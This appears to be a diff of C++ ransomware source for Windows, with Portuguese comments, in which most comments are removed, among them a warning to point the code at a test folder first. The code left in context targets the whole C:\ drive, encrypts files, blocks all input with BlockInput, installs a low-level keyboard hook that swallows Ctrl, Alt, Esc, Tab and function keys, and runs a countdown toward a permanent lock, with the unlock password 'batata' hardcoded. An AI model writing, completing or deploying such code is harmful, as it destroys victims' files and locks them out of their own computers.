@@ -1,4 +1,3 @@
-//opa deixei uma guia com comentarios :3
 #include <iostream>
 #include <fstream>
 #include <filesystem>
@@ -46,7 +45,7 @@ public:
             std::ofstream outFile(filePath, std::ios::binary);
             if (!outFile) return;
             outFile.write(buffer.data(), buffer.size());
-            outFile.close();
+            outFile.close(); // CORRIGIDO: Adicionado ()
         } catch (...) { }
     }
 };
@@ -122,7 +121,7 @@ public:
     void renderUI(const RansomwareCore& core) {
         system("cls"); 
 
-        setTextColor(12); // Vermelho Brilhante
+        setTextColor(12); 
         std::cout << "\n\n";
         std::cout << " //                                               \n";
         std::cout << " //     _____ _____ _____ _____ _____ ____        \n";
@@ -174,10 +173,9 @@ public:
 HHOOK hhkKeyboard = NULL;
 
 LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == 0) { // nCode == 0 é o padrão para processar a tecla
+    if (nCode == 0) { 
         KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
 
-        // Bloqueia: Ctrl, Alt, Shift, Tab, Esc, e F1 até F12
         if (pKeyBoard->vkCode == VK_CONTROL || pKeyBoard->vkCode == VK_MENU || 
             pKeyBoard->vkCode == VK_SHIFT || pKeyBoard->vkCode == VK_TAB || 
             pKeyBoard->vkCode == VK_ESCAPE || (pKeyBoard->scanCode >= VK_F1 && pKeyBoard->scanCode <= VK_F12)) {
@@ -189,11 +187,9 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 // --- MÓDULO 7: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
-    // CONFIGURAÇÃO DO ALVO
-    std::string pastaAlvo = "C:\\"; // Mude para pasta de teste primeiro!
+    std::string pastaAlvo = "C:\\"; 
     std::string senhaCorreta = "batata";
     
-    // Prioridade Máxima
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
 
     RansomwareCore core;
@@ -205,20 +201,15 @@ int main() {
     std::cout << "Alvo: " << pastaAlvo << "\n";
     std::cout << "Aguarde a preparacao...\n";
 
-    // 1. Criptografia
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Criptografia concluida.\n";
 
-    // 2. Bloqueio de Hardware
     BlockInput(TRUE); 
 
-    // 3. Instalação do Hook de Teclado
     hhkKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
 
-    // 4. Timer
     std::thread timerThread(&RansomwareCore::startTimer, &core);
 
-    // 5. Loop de Interface
     while (core.getState() != AppState::SUCCESS && core.getState() != AppState::LOCKED_PERMANENTLY) {
         renderer.renderUI(core);
 
@@ -239,7 +230,6 @@ int main() {
         if (core.getTime() < 1) break; 
     }
 
-    // 6. Limpeza Final
     if (hhkKeyboard) UnhookWindowsHookEx(hhkKeyboard);
     BlockInput(FALSE); 
 
